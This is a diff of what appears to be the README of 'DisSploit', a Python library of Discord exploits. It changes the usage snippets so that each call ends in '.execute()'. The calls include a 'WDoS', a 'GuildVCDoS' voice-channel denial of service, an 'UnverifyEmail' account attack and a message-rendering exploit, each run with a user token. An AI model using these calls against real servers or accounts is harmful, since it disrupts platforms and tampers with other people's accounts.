@@ -58,7 +58,7 @@ from DisSploit import Exploits
 RenderSploits = Exploits.render()
 
 # Main code
-RenderSploits.editTagChange(token, channel_id, message)
+RenderSploits.editTagChange(token, channel_id, message).execute()
 ```
 URI Exploits
 ```python
@@ -68,7 +68,7 @@ from DisSploit import Exploits
 URISploits = Exploits.URI()
 
 # Main code
-URISploits.WDoS(token, channel_id)
+URISploits.WDoS(token, channel_id).execute()
 ```
 Misc Exploits
 ```python
@@ -78,6 +78,6 @@ from DisSploit import Exploits
 MiscSploits = Exploits.Misc()
 
 # Main code
-MiscSploits.GuildVCDoS(token, guild_id)
-MiscSploits.UnverifyEmail(token, channel_id)
+MiscSploits.GuildVCDoS(token, guild_id).execute()
+MiscSploits.UnverifyEmail(token, channel_id).execute()
 ```
